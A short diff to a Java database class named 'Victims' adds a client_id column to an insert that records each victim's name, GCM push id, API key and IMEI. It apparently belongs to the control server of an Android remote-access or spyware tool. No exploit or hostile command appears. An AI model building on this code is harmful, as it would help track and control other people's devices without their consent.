@@ -16,6 +16,7 @@ public class Victims extends BaseTable<Victim> {
     public static final String COLUMN_GCM_ID = "gcm_id";
     public static final java.lang.String COLUMN_API_KEY = "api_key";
     private static final String TABLE_VICTIMS = "victims";
+    public static final String COLUMN_CLIENT_ID = "client_id";
 
     private Victims() {
     }
@@ -44,7 +45,7 @@ public class Victims extends BaseTable<Victim> {
                 //Collecting victim
                 final String apiKey = rs.getString(COLUMN_API_KEY);
                 final String gcmId = rs.getString(COLUMN_GCM_ID);
-                victim = new Victim(null, null, apiKey, gcmId);
+                victim = new Victim(null, null, null, apiKey, gcmId);
             }
 
             rs.close();
@@ -68,7 +69,7 @@ public class Victims extends BaseTable<Victim> {
     @Override
     public boolean add(Victim victim) {
 
-        final String addVictimQuery = "INSERT INTO victims (name,gcm_id,api_key,imei) VALUES (?,?,?,?);";
+        final String addVictimQuery = "INSERT INTO victims (name,gcm_id,client_id,api_key,imei) VALUES (?,?,?,?,?);";
         final java.sql.Connection connection = Connection.getConnection();
 
         //To track the success
@@ -76,12 +77,17 @@ public class Victims extends BaseTable<Victim> {
 
         try {
             final PreparedStatement ps = connection.prepareStatement(addVictimQuery);
+
             ps.setString(1, victim.getName());
             ps.setString(2, victim.getGCMId());
-            ps.setString(3, victim.getApiKey());
-            ps.setString(4, victim.getIMEI());
+            ps.setString(3, victim.getClientId());
+            ps.setString(4, victim.getApiKey());
+            ps.setString(5, victim.getIMEI());
+
             isVictimAdded = ps.executeUpdate() == 1;
+
             ps.close();
+
         } catch (SQLException e) {
             e.printStackTrace();
         } finally {
